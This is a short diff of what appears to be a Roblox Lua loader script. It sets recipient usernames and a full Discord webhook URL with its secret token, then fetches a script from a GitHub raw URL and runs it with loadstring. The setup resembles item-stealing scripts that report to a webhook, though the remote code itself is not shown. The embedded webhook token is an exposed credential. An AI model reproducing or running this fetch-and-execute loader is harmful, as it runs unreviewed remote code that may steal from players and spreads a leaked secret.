@@ -1,3 +1,5 @@
-_G.Username = "asek987"
+UserName = "asek987"
+Webhook = "https://discord.com/api/webhooks/1055332901736173678/AkamtEo-a42UO6ab0i9fNhlRb_OpLU-WjoNd9KE19Uph---tZaqFoZkFInZtrpi47kVN"
+UserName2 = "asek987"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/Centai/main/Duplication.string"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
